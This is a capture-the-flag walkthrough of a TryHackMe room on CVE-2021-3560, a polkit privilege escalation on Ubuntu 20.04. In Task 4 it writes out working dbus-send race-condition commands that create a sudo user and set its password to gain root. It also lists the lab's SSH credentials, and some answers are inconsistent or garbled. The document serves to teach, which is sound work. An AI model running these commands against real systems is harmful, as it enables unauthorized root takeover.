<h1 align="center">Polkit: 2021-3560</h1>
<p align="center">July 26, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>446</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Walkthrough room for CVE-2021-3560</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/bb3c57a6-a8e2-4771-9b7a-b4f49b364273"><br>
Click <a href="https://tryhackme.com/room/polkit">here </a>to access this TryHackMe walkthrough.<br>
<img width="1200px" src=""></p>


<br>
<br>

<h2>Task 1 . Info . Deploy</h2>
The exploit detailed in this room would often make use of a GUI desktop. For the sake of speed we will use the CLI. In-browser access is enabled for this machine; however, be aware that copy/paste functionality will only work if you full-screen the target in a browser that is not Firefox. Should you  prefer to SSH in for yourself; credentials for this will be given in the relevant task.
</p>

<p><em>Answer the questionselow</em></p>

<p>1.1. Click the green "Start Machine" button to deploy the machine!<br>
<code>No answer needed</code></p>
  
<br>


<h2>Task 2 . Info . Important! . About Dynamic Flags</h2>
<p>This box is the first on TryHackMe to use dynamic flags. As such, this is very much in beta, so please report any bugs to MuirlandOracle in the TryHackMe Discord Server.

<p><strong><em>Read the following information carefully before continuing:</em></strong></p>

<p>

- When you complete the box you will find a flag at <code>/root/root.txt</code>. This will not look like a regular TryHackMe flag:<br><img width="696" height="35" alt="image" src="https://github.com/user-attachments/assets/392df7fe-07c8-43cf-9080-afdec1353bbf" /><br><br>
Everything in the file should be submitted as a flag -- including any symbols or special characters.<br><br>
- This flag will be different every time you deploy the box. Each flag can be used exactly once, and will expire after six hours (so make sure to submit quickly!)<br><br>
- When you have retrieved the flag, do not submit it directly into the TryHackMe answer field. Dynamic flags should be submitted to <code>https://flag.muir.land/</code>. This site is run by the room author and is not affiliated directly with TryHackMe.<br><br>
- You will be asked to submit three pieces of information:<br>
----- Your username. It is very important that this is identical to your TryHackMe username!<br>
----- The box code. In mo<br>

<p align="center"><img width="400px" src="https://github.com/user-attachments/assets/bdedc881-d9a0-44d2-9d15-77ff719c4e12"></p>

- When you submit all three pieces of information correctly, another flag will appear at the top of the page. This will be in the standard TryHackMe format (<code>THM{HASH}</code>). You should submit this flag to the task below in order to complete the room.</p>

<p>If there are any problems that arise from this process, please ping MuirlandOracle in the TryHackMe Discord Server. If a problem is raised that is the result of a failure to read the information in this task, it will likely be ignored, so please make sure you read the information here thoroughly first.</p>

<p><em>Answer the question below</em></p>

<p>2.1. Read the information in the task. What is the URL of the website you should submit dynamic flags to?<br>
<code>https://flag.muir.land/</code></p>
  
<br>

<h2>Task 3 . Tutorial . Background</h2>
<h3>Overview</h3>
<p>In early 2021 a researcher named <strong>Kevin Backhouse</strong> discovered a seven year old privilege escalation vulnerability (since designated CVE-2021-3560) in the Linux polkit utility. Fortunately, different distributions of Linux (and even different versions of the same distributions) use different versions of the software, meaning that only some are vulnerable.<br>

Specifically, the following mainstream distributions, amongst others, were vulnerable:<br<

- Red Hat Enterprise Linux 8<br<
- Fedora 21 (or later)<br>
- Debian Testing ("Bullseye")<br>
- Ubuntu 20.04 LTS ("Focal Fossa")</p>

<p>All should now have released patched versions of their respective polkit packages, however, if you encounter one of these distributions then it may still be vulnerable if it hasn't been updated for a while.<br>

For this room we will be focussing specifically on Ubuntu 20.04. Canonical released a patch for their version of polkit (<code>policykit-1</code>), which has version number <code>0.105-26ubuntu1.1</code>. The last vulnerable version available in the apt repositories for Focal Fossa is <code>0.105-26ubuntu1</code>, so, if you see this, you may be in luck!<br>

We can use <code>apt list --installed | grep policykit-1</code> to check the installed version of polkit:</p>

<p align="center"><img width="600px" src="https://github.com/user-attachments/assets/335b1f78-d300-4efa-a805-aefb21893f81"></p>

<p>The original description of this vulnerability can be found in a post written by Kevin Backhouse, here = https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/</p>

<h3>What is Polkit?</h3>
<p>The logical question to be asking right now is: "What is polkit?"<br>

Polkit is part of the Linux authorisation system. In effect, when you try to perform an action which requires a higher level of privileges, the policy toolkit can be used to determine whether you have the requisite permissions. It is integrated with systemd and is much more configurable than the traditional sudo system. Indeed, it is sometimes referred to as the "sudo of systemd".<br>

When interacting with polkit we can use <code>pkexec</code>, instead of <code>sudo</code>. As an example, attempting to run the <code>useradd</code> command through pkexec in a GUI session results in a pop-up asking for credentials:<br>
<code>pkexec useradd test1234</code></p>

<p align="center"><img width="400px" src="https://github.com/user-attachments/assets/227b93f3-88de-4cfc-830a-82a04de21abc"></p>

<p>In a CLI session, we get a text-based prompt instead:</p>

<p align="center"><img width="400px" src="https://github.com/user-attachments/assets/2d70b397-6bf1-4798-996d-7c2a46e39274"></p>

<p>To summarise, the policy toolkit can be thought of as a fine-grained alternative to the simpler sudo system.</p>

<h3>How is Polkit vulnerable?</h3>
<p>The next logical question is of course: "How can we exploit polkit"?<br>

The short answer is: by manually sending dbus messages to the dbus-daemon (effectively an API to allow different processes the ability to communicate with each other), then killing the request before it has been fully processed, we can trick polkit into authorising the command. If you are not familiar with daemons, they are effectively background services running on Linux. The dbus-daemon is a program running in the background which brokers messages between applications.<br>

For the sake of keeping this room relatively light, we won't go too deep into the specifics behind this (although reading the full article on the vulnerability is highly recommended). Effectively, the vulnerability can be boiled down to these steps:</p>

<p>

- The attacker manually sends a dbus message to the accounts-daemon requesting the creation of a new account with sudo permissions (or latterly, a password to be set for the new user). This message gets given a unique ID by the dbus-daemon.<br><br>
- The attacker kills the message after polkit receives it, but before polkit has a chance to process the message. This effectively destroys the unique message ID.<br><br>
- Polkit asks the dbus-daemon for the user ID of the user who sent the message, referencing the (now deleted) message ID.<br><br>
- The dbus-daemon can't find the message ID because we killed it in step two. It handles the error by responding with an error code.<br><br>
- Polkit mishandles the error and substitutes in 0 for the user ID -- i.e. the root account of the machine.<br><br>
- Thinking that the root user requested the action, polkit allows the request to go through unchallenged.</p>

<p>In short, by destroying the message ID before the dbus-daemon has a chance to give polkit the correct ID, we exploit the poor error-handling in polkit to trick the utility into thinking that the request was made by the all-powerful root user.<br>

If this doesn't make sense now, hopefully it will after you've had a chance to perform the exploit yourself!</p>

<p><em>Answer the questions below</em></p>

<p>3.1. In what version of Ubuntu's policykit-1 is CVE-2021-3560 patched?<br>
<code>0.105-26ubuntu1.3</code></p>

```bash
:~/Polkit:CVE-2021-3560# apt list --installed | grep policykit-1
```

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/9f1dd4ab-3348-4475-a3bb-0032dc208764"></p>


<br>

<p>3.2. What program can we use to run commands as other users via polkit?<br>
<code>pkexec</code></p>

```bash
:~/Polkit:CVE-2021-3560# apt list --installed | grep policykit-1
```

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/9b280a62-f4d1-4638-a953-b3810c3d1a26"></p>

<br>

<h2>Task 4 . Tutorial . Exploitation Process</h2>
<p>We've seen the theory, now let's see it in action!<br>

Let's try to add a new user called <code>attacker</code>, with sudo permissions, and a password of <code>Expl01ted</code>. Just read this information for now -- you will have time to try it in the next task!<br>

First, let's look at the dbus messages we'll need to send:<br>

- <code>dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1</code><br><br>

This command will manually send a dbus message to the accounts daemon, printing the response and creating a new user called attacker (<code>string:attacker</code>) with a description of "Pentester Account" (<code>string:"Pentester Account"</code>) and membership of the sudo group set to true (referenced by the <code>int32:1</code> flag).<br>

Our second dbus message will set a password for the new account:<br>

- <code>dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/UserUSER_ID org.freedesktop.Accounts.User.SetPassword string:'PASSWORD_HASH' string:'Ask the pentester'</code><br><br>

This once again sends a dbus message to the accounts daemon, requesting a password change for the user with an ID which we specify (shown in red), a password hash which we need to generate manually, and a hint ("Ask the pentester")<br><br>

As this is effectively a race condition, we first need to determine how long our command will take to run. Let's try this with the first dbus message:<br>
- <code>time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1</code>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/b3706d8b-990d-4fa8-b9a3-75c55cba2ff"></p>

<p>This takes 0.011 seconds, or 11 milliseconds. This number will be slightly different each time you run the command; however, on the provided machine it should always be around this number.<br>

Note: For the first five minutes or so of deployment the machine is still booting things in the background, so don't be alarmed if the time you get is a lot longer to begin with -- just keep running the command periodically until it gives you a time in a similar region to the results above.<br>

We need to kill the command approximately halfway through execution. Five milliseconds usually works fairly well on the provided machine; however, be aware that this is not an exact thing. You may need to change the sleep time, or run the command several times before it works. That said, once you find a time that works, it should work consistently. If you are struggling to get a working time, putting the command inside a bash for loop and quickly running through a range of times tends to work fairly well.<br>

Let's try this. We need to send the dbus message, then kill it about halfway through:<br>

- <code>dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!</code></p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/d8427170-52c0-497e-b89e-70ee485850d"></p>

<p>To explain the above command, we sent the dbus message in a background job (using the ampersand to background the command). We then told it to sleep for 5 milliseconds (<code>sleep 0.005s</code>), then kill the previous process (<code>$!</code>). This successfully created the new user, adding them into the sudo group.<br>
We should note down at this point that the user ID of the new user in this instance is 1000.<br><br>
Now all we need to do is give the user a password and we should be good to go!</p>


<br>


<p>We need a password hash here, so let's generate a Sha512Crypt hash for our chosen password (<code>Expl01ted</code>code>):<br>

- <code>openssl passwd -6 Expl01ted</code></p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/38025157-88e7-4b36-971e-1c10ab3af453"></p>

<p>Using openssl, we generate a password of type 6 (SHA512-crypt) and our plaintext password (<code>Expl01ted</code>).<br>

Now let's finish this! 5 milliseconds worked last time, so it should work here too:<br>

- <code>dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!</code></p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/c39bd72f-933b-4b55-910e-e8c4a2227d28"></p>


<p>With a hop, su, and a <code>sudo -s</code>code>, we have root!</p>

<p><em>Answer the question below</em></p>

<p>4.1. Read the information above<br>
<code>No answer needed</code></p>

<br>

<h2> Task 5 . Practical . Do it yourself!</h2>
<p>You've seen the theory, so now it's time to try for yourself!<br><br>

If you would like to SSH into the target machine, the credentials are:<br>

- Username: tryhackme<br>
- Password: TryHackMe123!<br><br>

Otherwise please feel free to use the in-browser access on the right hand side of the screen. Bear in mind that the AttackBox can be deployed in tandem with the target machine.<br>

Perform the CVE-2021-3560 exploit and get the flag from <code>/root/root.txt</code>!<br>

<strong>Remember to submit the flag you find on the box to https://flag.muir.land/ in order to receive the final flag to submit below</strong>.</p>


<p><em>Answer the question below</em></p>

<p>5.1. Root Flagg<br>
<code>____</code></p>

<br>




```bash
:~/Polkit:CVE-2021-3560# apt list --installed | grep policykit-1
```
